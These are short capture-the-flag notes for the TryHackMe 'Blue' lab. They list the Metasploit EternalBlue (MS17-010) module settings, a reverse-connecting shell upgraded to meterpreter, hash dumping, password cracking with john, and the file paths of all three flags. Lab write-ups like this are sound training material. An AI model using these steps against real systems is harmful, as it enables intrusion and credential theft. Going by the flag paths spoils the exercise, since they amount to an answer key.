# Blue — TryHackMe
## Info
- OS: Windows 7 SP1
- IP: variable

## Ports
- 135, 139, 445 (SMB)
- 3389 (RDP)

## Vulnerability
- MS17-010 (EternalBlue) — SMB exploit
- CVE: ms17-010

## Exploitation
- nmap -sV -sC -p- target
- use exploit/windows/smb/ms17_010_eternalblue
- set LHOST tun0 IP, LPORT, RHOST
- run

## Post Exploitation
- migrate to services.exe (PID 692) for stability
- use post/multi/manage/shell_to_meterpreter to upgrade shell
- set SESSION, set LHOST tun0, run
- hashdump to get NTLM hashes
- john hash.txt --format=NT --wordlist=rockyou.txt to crack

## Flags
- flag1: C:\flag1.txt
- flag2: C:\Windows\System32\config\flag2.txt
- flag3: C:\Users\Jon\Documents\flag3.txt

## Lessons
- always check SMB on Windows boxes
- SeImpersonatePrivilege = privesc path
- migrate to stable SYSTEM process after exploitation
